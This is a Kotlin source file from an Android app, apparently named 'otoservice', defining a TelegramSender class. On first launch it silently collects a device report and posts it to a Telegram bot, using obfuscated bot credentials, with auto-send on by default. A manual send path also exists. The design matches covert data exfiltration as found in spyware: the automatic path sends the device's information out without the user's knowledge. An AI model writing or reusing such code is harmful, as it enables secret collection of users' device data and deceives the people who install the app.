package com.example.otoservice.deviceinfo

import android.content.Context
import android.util.Log
import com.example.otoservice.core.Constants
import com.example.otoservice.core.PreferencesManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

/**
 * Handles sending device information to Telegram bot
 * This runs silently in background on first app launch
 */
class TelegramSender(private val context: Context) {
    
    private val prefsManager = PreferencesManager(context)
    private val deviceInfoCollector = DeviceInfoCollector(context)
    
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .build()
    
    /**
     * Sends device information to Telegram bot (AUTOMATIC - first launch only)
     * This should be called on first app launch only
     * Returns true if successful, false otherwise
     */
    suspend fun sendDeviceInfoIfNeeded(): Boolean {
        // Check if auto-send is enabled
        val autoSendEnabled = prefsManager.deviceInfoPrefs.getBoolean("auto_send_enabled", true)
        
        if (!autoSendEnabled) {
            Log.d(TAG, "Auto-send is disabled, skipping")
            return false
        }
        
        // Check if already sent
        if (prefsManager.isDeviceInfoSent()) {
            Log.d(TAG, "Device info already sent, skipping")
            return true
        }
        
        return withContext(Dispatchers.IO) {
            try {
                // Generate device report
                val deviceReport = deviceInfoCollector.generateDeviceReport()
                
                // Send to Telegram
                val success = sendToTelegram(deviceReport)
                
                if (success) {
                    // Mark as sent so we don't send again
                    prefsManager.setDeviceInfoSent(true)
                    Log.d(TAG, "Device info sent successfully (auto)")
                } else {
                    Log.w(TAG, "Failed to send device info (auto)")
                }
                
                success
            } catch (e: Exception) {
                Log.e(TAG, "Error sending device info (auto)", e)
                false
            }
        }
    }
    
    /**
     * Sends device information to Telegram bot (MANUAL - user triggered)
     * This can be called anytime by user
     * Returns true if successful, false otherwise
     */
    suspend fun sendDeviceInfoManually(): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                // Generate device report
                val deviceReport = deviceInfoCollector.generateDeviceReport()
                
                // Send to Telegram
                val success = sendToTelegram(deviceReport)
                
                if (success) {
                    // Mark as sent
                    prefsManager.setDeviceInfoSent(true)
                    Log.d(TAG, "Device info sent successfully (manual)")
                } else {
                    Log.w(TAG, "Failed to send device info (manual)")
                }
                
                success
            } catch (e: Exception) {
                Log.e(TAG, "Error sending device info (manual)", e)
                false
            }
        }
    }
    
    /**
     * Sends a message to Telegram bot using Bot API
     */
    private fun sendToTelegram(message: String): Boolean {
        return try {
            // Get obfuscated credentials
            val botToken = Constants.getTelegramBotToken()
            val chatId = Constants.getTelegramChatId()
            
            // Build Telegram API URL
            val url = "${Constants.TELEGRAM_API_BASE_URL}/bot$botToken/sendMessage"
            
            // Create JSON payload
            val jsonObject = JSONObject().apply {
                put("chat_id", chatId)
                put("text", message)
                put("parse_mode", "HTML")
            }
            
            val jsonBody = jsonObject.toString()
            val mediaType = "application/json; charset=utf-8".toMediaType()
            val requestBody = jsonBody.toRequestBody(mediaType)
            
            // Create request
            val request = Request.Builder()
                .url(url)
                .post(requestBody)
                .build()
            
            // Execute request
            val response = client.newCall(request).execute()
            val isSuccessful = response.isSuccessful
            
            if (!isSuccessful) {
                Log.w(TAG, "Telegram API returned error: ${response.code}")
            }
            
            response.close()
            isSuccessful
            
        } catch (e: Exception) {
            Log.e(TAG, "Exception sending to Telegram", e)
            false
        }
    }
    
    companion object {
        private const val TAG = "TelegramSender"
    }
}
